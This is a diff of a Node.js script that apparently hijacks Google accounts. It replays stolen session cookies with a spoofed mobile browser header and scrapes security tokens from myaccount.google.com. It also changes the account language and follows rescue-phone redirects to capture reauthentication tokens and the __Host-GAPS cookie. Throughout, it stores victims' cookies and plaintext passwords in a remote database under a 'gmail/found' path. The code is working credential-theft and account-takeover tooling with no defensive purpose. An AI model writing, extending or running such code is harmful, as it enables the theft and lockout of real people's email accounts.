@@ -273,80 +273,124 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
 
 
 function getRaptToken(connection, password, mData, sendCookies) {
-
+    
     request({
-        url: 'https://myaccount.google.com/signinoptions/rescuephone',
+        url: 'https://myaccount.google.com/phone',
         method: 'GET',
         headers: {
             'Cookie': sendCookies,
             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        },
-        followRedirect: false
+        }
     }, function(error, response, body) {
         let wrong = true
         try {
-            if (!error) {
-                let headers = response.headers
-                if(headers && headers['location']) {
-                    let index = headers['location'].indexOf('rart=')
-                    let split = headers['location'].substring(index, headers['location'].length).split('&')
+            if(!error) {
+                let index = body.indexOf('SNlM0e')
+                if(index != -1) {
+                    let temp = body.substring(index+6, index+100)
+                    let time = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
                     wrong = false
                     request({
-                        url: 'https://accounts.google.com/ServiceLogin?'+split[0],
-                        method: 'GET',
+                        url: 'https://myaccount.google.com/_/language_update',
+                        method: 'POST',
+                        body: getLanguage(time),
                         headers: {
                             'Cookie': sendCookies,
+                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                         },
                         followRedirect: false
                     }, function(error, response, body) {
-                        let wrong = true
-                        try {
-                            if (!error) {
-                                let headers = response.headers
-                                 if(headers && headers['location']) {
-                                    let index = headers['location'].indexOf('TL=')
-                                    let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
-                                    index = headers['location'].indexOf('cid=')
-                                    let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
-                                    cookiesList = headers['set-cookie']
-                                    let gps = mData[4]
-                                    for(let i=0; i<cookiesList.length; i++) {
-                                        let singelData = cookiesList[i]
-                                        try {
-                                            let start = singelData.indexOf('=')
-                                            let end = singelData.indexOf(';')
-                                            let key = singelData.substring(0, start)
-                                            if(key == '__Host-GAPS') {
-                                                gps = singelData.substring(start+1, end)
-                                                i = cookiesList.length
-                                            }
-                                        } catch (e) {}
+                        request({
+                            url: 'https://myaccount.google.com/signinoptions/rescuephone',
+                            method: 'GET',
+                            headers: {
+                                'Cookie': sendCookies,
+                                'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                            },
+                            followRedirect: false
+                        }, function(error, response, body) {
+                            let wrong = true
+                            try {
+                                if (!error) {
+                                    let headers = response.headers
+                                    if(headers && headers['location']) {
+                                        let index = headers['location'].indexOf('rart=')
+                                        let split = headers['location'].substring(index, headers['location'].length).split('&')
+                                        wrong = false
+                                        request({
+                                            url: 'https://accounts.google.com/ServiceLogin?'+split[0],
+                                            method: 'GET',
+                                            headers: {
+                                                'Cookie': sendCookies,
+                                                'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                                            },
+                                            followRedirect: false
+                                        }, function(error, response, body) {
+                                            let wrong = true
+                                            try {
+                                                if (!error) {
+                                                    let headers = response.headers
+                                                     if(headers && headers['location']) {
+                                                        let index = headers['location'].indexOf('TL=')
+                                                        let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
+                                                        index = headers['location'].indexOf('cid=')
+                                                        let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
+                                                        cookiesList = headers['set-cookie']
+                                                        let gps = mData[4]
+                                                        for(let i=0; i<cookiesList.length; i++) {
+                                                            let singelData = cookiesList[i]
+                                                            try {
+                                                                let start = singelData.indexOf('=')
+                                                                let end = singelData.indexOf(';')
+                                                                let key = singelData.substring(0, start)
+                                                                if(key == '__Host-GAPS') {
+                                                                    gps = singelData.substring(start+1, end)
+                                                                    i = cookiesList.length
+                                                                }
+                                                            } catch (e) {}
+                                                        }
+                                                        wrong = false
+                                                        mData[3] = tl
+                                                        mData[4] = gps
+                                                        mData[5] = cid
+                                                        mData[6] = password
+                                                        passwordMatching(connection, mData, sendCookies, 1, 0, gps)
+                                                    }
+                                                } else {}
+                                            } catch (e) {}
+
+                                            try {
+                                                if(wrong && connection != null) {
+                                                    let send = sendCookies
+                                                    if(send == null) {
+                                                        send = {}
+                                                    }
+                                                    send['PASS'] = password
+                                                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                                    connection.end(mData[0]+' 2')
+                                                }
+                                            } catch (e) {}
+                                        })
                                     }
-                                    wrong = false
-                                    mData[3] = tl
-                                    mData[4] = gps
-                                    mData[5] = cid
-                                    mData[6] = password
-                                    passwordMatching(connection, mData, sendCookies, 1, 0, gps)
+                                } else {}
+                            } catch (e) {}
+
+                            try {
+                                if(wrong && connection != null) {
+                                    let send = sendCookies
+                                    if(send == null) {
+                                        send = {}
+                                    }
+                                    send['PASS'] = password
+                                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                    connection.end(mData[0]+' 3')
                                 }
-                            } else {}
-                        } catch (e) {}
-                        
-                        try {
-                            if(wrong && connection != null) {
-                                let send = sendCookies
-                                if(send == null) {
-                                    send = {}
-                                }
-                                send['PASS'] = password
-                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                connection.end(mData[0]+' 2')
-                            }
-                        } catch (e) {}
+                            } catch (e) {}
+                        })
                     })
                 }
-            } else {}
+            }
         } catch (e) {}
         
         try {
@@ -357,7 +401,7 @@ function getRaptToken(connection, password, mData, sendCookies) {
                 }
                 send['PASS'] = password
                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                connection.end(mData[0]+' 3')
+                connection.end(mData[0]+' 33')
             }
         } catch (e) {}
     })
@@ -723,6 +767,10 @@ function getChangePasswordData(password, time) {
 
 function getLogOut(token, time) {
     return 'f.req='+encodeURIComponent(JSON.stringify([[["YZ6Dc","[null,null,\""+token+"\"]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
+}
+
+function getLanguage(time) {
+    return 'f.req=%5b%5b%22en%22%5d%5d&at='+encodeURIComponent(time)
 }
 
 function checkYear(data) {
